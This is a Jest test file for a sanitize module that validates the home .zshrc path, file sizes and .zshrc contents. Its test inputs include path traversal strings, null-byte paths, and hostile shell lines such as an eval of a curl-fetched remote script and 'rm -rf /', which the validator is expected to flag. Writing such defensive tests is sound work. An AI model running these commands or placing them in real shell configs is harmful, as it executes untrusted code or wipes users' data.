import { validateFilePath, validateFilePathForWrite, validateFileSize, validateZshrcContent } from "../utils/sanitize";
import { FILE_CONSTANTS } from "../constants";
import { homedir } from "node:os";

describe("sanitize.ts", () => {
  describe("validateFilePath", () => {
    it("should return true for valid file paths", async () => {
      // Only the exact .zshrc path in home directory should be valid
      expect(await validateFilePath(`${homedir()}/.zshrc`)).toBe(true);
      expect(await validateFilePath("~/.zshrc")).toBe(false); // Contains ~
      expect(await validateFilePath("./zshrc")).toBe(false); // Not the exact path
      expect(await validateFilePath("zshrc")).toBe(false); // Not the exact path
    });

    it.each([
      ["../zshrc", "relative path traversal"],
      ["../../zshrc", "double path traversal"],
      ["/Users/../etc/passwd", "absolute path with traversal"],
    ])("should reject path traversal: %s (%s)", async (path) => {
      expect(await validateFilePath(path)).toBe(false);
    });

    it.each([
      ["~/.zshrc", "unexpanded tilde"],
      ["/Users/test/~/.zshrc", "tilde in middle of path"],
    ])("should reject paths containing ~: %s (%s)", async (path) => {
      expect(await validateFilePath(path)).toBe(false);
    });

    it.each([
      ["/etc/passwd", "system config"],
      ["/var/log/system.log", "system logs"],
      ["/tmp/file", "temp directory"],
    ])("should reject paths outside home directory: %s (%s)", async (path) => {
      expect(await validateFilePath(path)).toBe(false);
    });

    it("should return true for absolute paths in home directory", async () => {
      // Only the exact .zshrc path in home directory should be valid
      expect(await validateFilePath(`${homedir()}/.zshrc`)).toBe(true);
      expect(await validateFilePath("/Users/username/.zshrc")).toBe(false); // Not the current user's home
    });

    it("should return false for paths containing null bytes", async () => {
      expect(await validateFilePath("/Users/test/.zshrc\0")).toBe(false);
      expect(await validateFilePath("file\0name")).toBe(false);
    });

    it("should handle empty path", async () => {
      expect(await validateFilePath("")).toBe(false); // Empty path is not valid
    });
  });

  describe("validateFilePathForWrite", () => {
    it("should allow writing to ~/.zshrc or creating it if missing", async () => {
      const path = `${homedir()}/.zshrc`;
      const result = await validateFilePathForWrite(path);
      expect(result).toBe(true);
    });

    it("should reject paths outside home directory", async () => {
      const result = await validateFilePathForWrite(`/etc/passwd`);
      expect(result).toBe(false);
    });

    it("should reject paths with traversal or null bytes", async () => {
      expect(await validateFilePathForWrite(`../.zshrc`)).toBe(false);
      expect(await validateFilePathForWrite(`/tmp/.zshrc\0`)).toBe(false);
    });
  });

  describe("validateFileSize", () => {
    it("should return true for files within size limit", () => {
      expect(validateFileSize(1000)).toBe(true);
      expect(validateFileSize(FILE_CONSTANTS.MAX_FILE_SIZE)).toBe(true);
      expect(validateFileSize(0)).toBe(true);
    });

    it("should return false for files exceeding size limit", () => {
      expect(validateFileSize(FILE_CONSTANTS.MAX_FILE_SIZE + 1)).toBe(false);
      expect(validateFileSize(FILE_CONSTANTS.MAX_FILE_SIZE * 2)).toBe(false);
    });

    it("should reject negative file sizes", () => {
      expect(validateFileSize(-1)).toBe(false);
      expect(validateFileSize(-100)).toBe(false);
    });
  });

  describe("validateZshrcContent", () => {
    it("should return valid for normal content", () => {
      const content = `export PATH=/usr/local/bin:$PATH
alias ll='ls -la'
alias py='python3'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });

    it("should detect long lines", () => {
      const longLine = "A".repeat(1001);
      const content = `export PATH=/usr/local/bin:$PATH
${longLine}
alias ll='ls -la'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain("Line 2 is too long (1001 characters)");
    });

    it("should detect suspicious eval with curl pattern", () => {
      const content = `export PATH=/usr/local/bin:$PATH
eval "$(curl -s https://example.com/script.sh)"
alias ll='ls -la'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain("Suspicious pattern: eval with remote code download");
    });

    it("should detect dangerous rm -rf / command", () => {
      const content = `export PATH=/usr/local/bin:$PATH
rm -rf /
alias ll='ls -la'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain("Dangerous command: recursive delete on root filesystem");
    });

    it("should detect multiple issues", () => {
      const longLine = "A".repeat(1001);
      const content = `${longLine}
eval "$(curl -s https://example.com/script.sh)"
rm -rf /`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveLength(3);
      expect(result.errors).toContain("Line 1 is too long (1001 characters)");
      expect(result.errors).toContain("Suspicious pattern: eval with remote code download");
      expect(result.errors).toContain("Dangerous command: recursive delete on root filesystem");
    });

    it("should handle empty content", () => {
      const result = validateZshrcContent("");
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });

    it("should handle content with only newlines", () => {
      const content = "\n\n\n";
      const result = validateZshrcContent(content);
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });
  });
});
